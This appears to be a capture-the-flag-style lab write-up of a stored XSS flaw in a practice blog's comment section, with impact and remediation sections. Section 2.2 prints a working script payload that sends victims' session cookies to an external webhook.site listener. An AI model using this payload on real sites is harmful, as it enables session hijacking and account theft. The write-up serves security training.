# Lab: Stored Cross-Site Scripting (XSS) via Comment Functionality 

**Severity:** High 

**Vulnerability Type:** Stored Cross-Site Scripting (XSS)

**Target:** Web Security Academy Blog - Comment Section 

##### 1. Executive Summary 

During the security assessment of the "We Like to Blog" application, a Stored
Cross-Site Scripting (XSS) vulnerability was identified in the blog post 
comment section. 

The application fails to properly santise user-supplied input before storing
it in the database and rendering it to other users. This allows an attacker
to inject malicious JavaScript payloads. When a victim (such as an 
administrator) views the comment, the script executes within their browser
session. In this proof of concept, the vulnerability was successfully 
exploited to exfiltrate session data to an external server. 

##### 2. Technical Walkthrough 

2.1 Target Identification 

The assessment began by navigating to the target blog post functionality. The
page allows users to view posts and submit comments. 

<img width="1186" height="743" alt="a1" src="https://github.com/user-attachments/assets/8c501f5a-dd36-4c40-8433-cee15ed77450" />

2.2 Payload Construction and injection 

The comment body field was identified as a potential injection point. An 
attacker can craft a JavaScript payload designed to capture the victim's 
session cookie (`document.cookie`) and transmit it to an external server
controlled by the attacker (in this case, `webhook.site`).

The following payload was injected into the comment field:

```
<script>
fetch('https://webhook.site/YOUR-UNIQUE-ID', {
    method: 'POST',
    mode: 'no-cors',
    body: document.cookie
});
</script>
```

Upon submitting the comment, the application accepted the script tags without
sanitisation and stored the payload in the backend database. 

<img width="1186" height="747" alt="a2" src="https://github.com/user-attachments/assets/f5678fcf-c8a9-439b-ac08-5745c07d95f5" />

2.3 Execution and Exfiltration 

Once the comment was posted, the Stored XSS attack was active. When any user 
(victim) navigates to the blog post, the browser renders the stored comment
and automatically executes the malicious JavaScript.

The script initiates a `fetch` request to the attacker's listener, transmitting
the victim's session data. The screenshot below confirms the callback received 
by the attacker's server. 

<img width="1398" height="825" alt="a3" src="https://github.com/user-attachments/assets/8900ab20-61fb-44be-a007-c808e20d5979" />

##### 3. Impact Analysis 

The impact of this vulnerability is rated as High. Successful exploitation 
allows an attacker to:

- Session Hijacking: Steal session cookies (as demonstrated), allowing the
  attacker to take over the victim's account.

- Unauthorised Actions: Perform actions on behalf of the user, such as changin
  passwords or posting further malicious content.

- Phishing: Redirect users to malicious websites or display fake login forms
  to steal credentials.

##### 4. Remediation 

To mitigate this vulnerability, the following steps are recommended:

1. Input Validation: Implement strict allow-listing for all user input. Reject
any input containing special characters that are not explicitly required.

2. Output Encoding: Context-aware output encoding must be applied to all
user-supplied data before rendering it in the browser. Special characters (such
as `<` and `>`) should be converted to their HTML entity equivalents
(e.g., `&lt;` and `&gt;`).

3. Content Security Policy (CSP): Implement a robust CSP to restrict the
source from which scripts can be loaded and executed.

4. HttpOnly Cookies: Ensure session cookies are flagged as `HttpOnly` to prevent
them from being accessed via client-side JavaScript (`document.cookie`).
